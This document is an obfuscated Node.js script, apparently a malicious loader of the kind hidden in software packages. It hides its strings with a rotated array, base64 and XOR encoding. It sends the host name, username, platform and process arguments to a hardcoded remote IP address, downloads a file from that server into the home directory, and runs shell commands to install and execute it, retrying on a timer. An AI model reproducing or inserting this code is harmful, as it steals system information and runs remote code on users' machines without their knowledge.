const aS = H;
(function (aD, aE) {
  const aQ = H,
    aF = aD();
  while (!![]) {
    try {
      const aG =
        (parseInt(aQ(0x166)) / 0x1) * (parseInt(aQ(0x165)) / 0x2) +
        parseInt(aQ(0x158)) / 0x3 +
        -parseInt(aQ(0x15b)) / 0x4 +
        parseInt(aQ(0x141)) / 0x5 +
        (-parseInt(aQ(0x140)) / 0x6) * (-parseInt(aQ(0x168)) / 0x7) +
        (-parseInt(aQ(0x16e)) / 0x8) * (parseInt(aQ(0x161)) / 0x9) +
        (-parseInt(aQ(0x156)) / 0xa) * (-parseInt(aQ(0x16a)) / 0xb);
      if (aG === aE) break;
      else aF["push"](aF["shift"]());
    } catch (aH) {
      aF["push"](aF["shift"]());
    }
  }
})(F, 0x46d1a);
const I = (function () {
    let aD = !![];
    return function (aE, aF) {
      const aG = aD
        ? function () {
            if (aF) {
              const aH = aF["apply"](aE, arguments);
              return (aF = null), aH;
            }
          }
        : function () {};
      return (aD = ![]), aG;
    };
  })(),
  K = I(this, function () {
    const aR = H;
    return K[aR(0x163)]()
      [aR(0x154)](aR(0x15e))
      ["toString"]()
      [aR(0x175)](K)
      ["search"](aR(0x15e));
  });
K();
const L = aS(0x16b),
  O = aS(0x15c),
  P = require("os"),
  Q = require("fs"),
  a0 = (aD) => (
    (s1 = aD[aS(0x160)](0x1)), Buffer[aS(0x159)](s1, O)[aS(0x163)](L)
  );
(rq = require(a0(aS(0x14b)))),
  (pt = require(a0(aS(0x172)))),
  (zv = require(a0(aS(0x173) + aS(0x16c)))),
  (ex = require(a0("tY2hpbGRfcHJ" + "vY2Vzcw"))[a0(aS(0x153))]),
  (hd = P[a0(aS(0x14e))]()),
  (hs = P[a0(aS(0x164))]()),
  (pl = P[a0(aS(0x148))]()),
  (uin = P[a0(aS(0x14f))]());
let a1;
const a2 = aS(0x162) + "=",
  a3 = ":124",
  a4 = (aD) => Buffer["from"](aD, O)[aS(0x163)](L);
var a5 = "",
  a6 = "";
const a7 = [0x30, 0xd0, 0x59, 0x18],
  a8 = (aD) => {
    const aT = aS;
    let aE = "";
    for (let aF = 0x0; aF < aD[aT(0x149)]; aF++)
      (rr = 0xff & (aD[aF] ^ a7[0x3 & aF])), (aE += String[aT(0x155)](rr));
    return aE;
  },
  a9 = aS(0x174),
  aa = aS(0x14d) + "U3luYw",
  ab = a4(aS(0x14c)),
  ac = a4("ZXhpc3RzU3lu" + "Yw");
function ad(aD) {
  return Q[ac](aD);
}
const ae = [0x1f, 0xba, 0x76],
  af = [0x1e, 0xa6, 0x2a, 0x7b, 0x5f, 0xb4, 0x3c],
  ag = () => {
    const aU = aS,
      aD = a4(a9),
      aE = a4(aa),
      aF = a8(af);
    let aG = pt["join"](hd, aF);
    try {
      (aH = aG), Q[ab](aH, { recursive: !0x0 });
    } catch (aK) {
      aG = hd;
    }
    var aH;
    const aI = "" + a5 + a8(ae) + a6,
      aJ = pt[aU(0x14a)](aG, a8(ah));
    try {
      !(function (aL) {
        const aV = aU,
          aM = a4(aV(0x167));
        Q[aM](aL);
      })(aJ);
    } catch (aL) {}
    rq[aD](aI, (aM, aN, aO) => {
      if (!aM) {
        try {
          Q[aE](aJ, aO);
        } catch (aP) {}
        ak(aG);
      }
    });
  },
  ah = [0x44, 0xb5, 0x2a, 0x6c, 0x1e, 0xba, 0x2a],
  ai = [0x1f, 0xa0],
  aj = [0x40, 0xb1, 0x3a, 0x73, 0x51, 0xb7, 0x3c, 0x36, 0x5a, 0xa3, 0x36, 0x76],
  ak = (aD) => {
    const aW = aS,
      aE = a4(a9),
      aF = a4(aa),
      aG = "" + a5 + a8(ai),
      aH = pt[aW(0x14a)](aD, a8(aj));
    ad(aH)
      ? ao(aD)
      : rq[aE](aG, (aI, aJ, aK) => {
          if (!aI) {
            try {
              Q[aF](aH, aK);
            } catch (aL) {}
            ao(aD);
          }
        });
  },
  al = [0x53, 0xb4],
  am = [
    0x16, 0xf6, 0x79, 0x76, 0x40, 0xbd, 0x79, 0x71, 0x10, 0xfd, 0x74, 0x6b,
    0x59, 0xbc, 0x3c, 0x76, 0x44,
  ],
  an = [0x5e, 0xbf, 0x3d, 0x7d, 0x6f, 0xbd, 0x36, 0x7c, 0x45, 0xbc, 0x3c, 0x6b],
  ao = (aD) => {
    const aX = aS,
      aE = a8(al) + "\x20\x22" + aD + "\x22\x20" + a8(am),
      aF = pt[aX(0x14a)](aD, a8(an));
    try {
      ad(aF)
        ? as(aD)
        : ex(aE, (aG, aH, aI) => {
            at(aD);
          });
    } catch (aG) {}
  },
  ap = [0x5e, 0xbf, 0x3d, 0x7d],
  aq = [0x5e, 0xa0, 0x34, 0x38, 0x1d, 0xfd, 0x29, 0x6a, 0x55, 0xb6, 0x30, 0x60],
  ar = [0x59, 0xbe, 0x2a, 0x6c, 0x51, 0xbc, 0x35],
  as = (aD) => {
    const aE = pt["join"](aD, a8(ah)),
      aF = a8(ap) + "\x20" + aE;
    try {
      ex(aF, (aG, aH, aI) => {});
    } catch (aG) {}
  },
  at = (aD) => {
    const aY = aS,
      aE = a8(aq) + "\x20\x22" + aD + "\x22\x20" + a8(ar),
      aF = pt[aY(0x14a)](aD, a8(an));
    try {
      ad(aF)
        ? as(aD)
        : ex(aE, (aG, aH, aI) => {
            as(aD);
          });
    } catch (aG) {}
  };
(s_url = aS(0x15d)), (sForm = a0(aS(0x147))), (surl = a0(aS(0x15d)));
const au = a4(aS(0x171));
function H(a, b) {
  const c = F();
  return (
    (H = function (d, e) {
      d = d - 0x140;
      let f = c[d];
      return f;
    }),
    H(a, b)
  );
}
let av = aS(0x144);
const aw = async (aD) => {
    const b0 = aS,
      aE = ((aH) => {
        const aZ = H;
        let aI = 0x0 == aH ? aZ(0x151) + aZ(0x145) : aZ(0x15f) + aZ(0x16d);
        for (var aJ = "", aK = "", aL = "", aM = 0x0; aM < 0x4; aM++)
          (aJ += aI[0x2 * aM] + aI[0x2 * aM + 0x1]),
            (aK += aI[0x8 + 0x2 * aM] + aI[0x9 + 0x2 * aM]),
            (aL += aI[0x10 + aM]);
        return a4(a2[aZ(0x15a)](0x1)) + a4(aK + aJ + aL) + a3 + "4";
      })(aD),
      aF = a4(a9);
    let aG = aE + b0(0x143);
    (aG += b0(0x157)),
      rq[aF](aG, (aH, aI, aJ) => {
        aH
          ? aD < 0x1 && aw(0x1)
          : ((aK) => {
              const b1 = H;
              if (0x0 == aK[b1(0x154)](b1(0x152))) {
                let aL = "";
                try {
                  for (let aM = 0x3; aM < aK[b1(0x149)]; aM++) aL += aK[aM];
                  (arr = a4(aL)),
                    (arr = arr[b1(0x146)](",")),
                    (a5 = a4(a2[b1(0x15a)](0x1)) + arr[0x0] + a3 + "4"),
                    (a6 = arr[0x1]);
                } catch (aN) {
                  return 0x0;
                }
                return 0x1;
              }
              return 0x0;
            })(aJ) > 0x0 && (ax(), az());
      });
  },
  ax = async () => {
    const b2 = aS;
    (av = hs), "d" == pl[0x0] && (av = av + "+" + uin[a4(b2(0x16f))]);
    let aD = b2(0x170);
    try {
      aD += zv[a4(b2(0x169))][0x1];
    } catch (aE) {}
    ay("oqr", aD);
  },
  ay = async (aD, aE) => {
    const b3 = aS,
      aF = { ts: a1, type: a6, hid: av, ss: aD, cc: aE },
      aG = { [surl]: "" + a5 + a4(b3(0x142)), [sForm]: aF };
    try {
      rq[au](aG, (aH, aI, aJ) => {});
    } catch (aH) {}
  },
  az = async () =>
    await new Promise((aD, aE) => {
      ag();
    });
var aA = 0x0;
const aB = async () => {
  const b4 = aS;
  try {
    (a1 = Date[b4(0x150)]()[b4(0x163)]()), await aw(0x0);
  } catch (aD) {}
};
function F() {
  const b5 = [
    "MTc5MzM=",
    "704776XcIsUB",
    "dXNlcm5hbWU",
    "4A1",
    "cG9zdA",
    "tcGF0aA",
    "Ybm9kZTpwcm9",
    "Z2V0",
    "constructor",
    "6GIhNLI",
    "177330uvjtwe",
    "L2tleXM",
    "/s/",
    "cmp",
    "OTIu====",
    "split",
    "cZm9ybURhdGE",
    "YcGxhdGZvcm0",
    "length",
    "join",
    "AcmVxdWVzdA",
    "bWtkaXJTeW5j",
    "d3JpdGVGaWxl",
    "RaG9tZWRpcg",
    "ZdXNlckluZm8",
    "now",
    "NDcuMTE4Mzgu",
    "ZT3",
    "sZXhlYw",
    "search",
    "fromCharCode",
    "2660600VygmMI",
    "bc7f301710f4",
    "810189YRoXjW",
    "from",
    "substring",
    "871972JtXaNK",
    "base64",
    "adXJs",
    "(((.+)+)+)+$",
    "LjEzNS4xOTUu",
    "slice",
    "54gVKMRW",
    "aaHR0cDovLw=",
    "toString",
    "EaG9zdG5hbWU",
    "68774xrQFIJ",
    "13xuwWYi",
    "cm1TeW5j",
    "126203qHmhCQ",
    "YXJndg",
    "11zmpQVh",
    "utf8",
    "jZXNz",
  ];
  F = function () {
    return b5;
  };
  return F();
}
aB();
let aC = setInterval(() => {
  (aA += 0x1) < 0x3 ? aB() : clearInterval(aC);
}, 0x93f30);
